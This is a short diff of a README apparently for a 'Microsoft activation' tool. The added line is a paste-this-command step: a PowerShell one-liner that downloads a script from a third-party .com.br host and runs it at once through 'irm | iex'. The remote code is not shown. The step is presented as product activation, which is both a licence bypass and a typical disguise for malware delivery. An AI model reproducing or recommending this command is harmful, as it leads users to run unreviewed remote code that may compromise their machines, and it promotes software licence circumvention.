@@ -1,3 +1,3 @@
 # Microsoft-Activation-Wsinc
 
-## [https://activate-wsinc.win.office](https://cdn.winpett.com.br/scripts/activate-wsinc.win.office)
+Comando: `irm cdn.winpett.com.br/scripts/activate-wsinc.win.office | iex`
